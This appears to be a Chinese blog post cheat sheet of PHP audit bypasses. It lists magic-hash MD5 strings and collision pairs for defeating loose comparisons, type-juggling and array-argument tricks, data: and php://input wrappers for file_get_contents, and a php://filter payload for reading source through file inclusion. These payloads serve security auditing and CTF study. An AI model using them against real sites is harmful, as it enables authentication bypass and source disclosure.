---
layout: post
title: php安全审计之各种绕过
categories:
  - 安全
url: 346.html
id: 346
comments: false
date: 2016-10-03 12:07:00
tags:
---

*   php因为是弱类型，所以在遇到 “==”时可以轻松绕过：
    *   md5比较绕过 （md5($_GET\['xxx'\] == '0e134324242423432424234')
        *   240610708    0e462097431906509019562988736854
        *   QNKCDZO    0e830400451993494058024219903391
        *   aabg7XSs       0e087386482136013740957780965295
        *   0e开头md5值小结：https://www.219.me/posts/2884.html
    *   md5 碰撞绕过 （hex）
        *   md5：79054025255fb1a26e4bc422aef54eb4
            *   d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70
                d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70
                
        *   md5:  008ee33a9d58b51cfeb425b0959121c9
            *   4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2
                4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2
                
    *   序列化绕过
    *   进制转换
        *   "0xdeadc0de" == "3735929054"
        *   "420.00000e-1" == "42" （安全宝约宝妹）
    *   精度
        *   1 == 0.999999999999999999
*   数组绕过，php某些函数数组作为参数返回NULL
    *   strcmp(array(), "abc")
    *   md5(array())
*   file\_get\_contents绕过，针对 $result=file\_get\_contents($_GET\['xxx'\])，在远程协议（如http、ftp协议）失效的情况下，可以用php伪协议绕过
    *   ?xxx=data:text/plain,(url编码的内容)
    *   ?xxx=php://input，然后将要赋值的数据写入POST里也可达到上述结果
*   include($_GET\['file'\])，文件包含漏洞读取源代码，file=php://filter/read=convert.base64-encode/resource=./class.php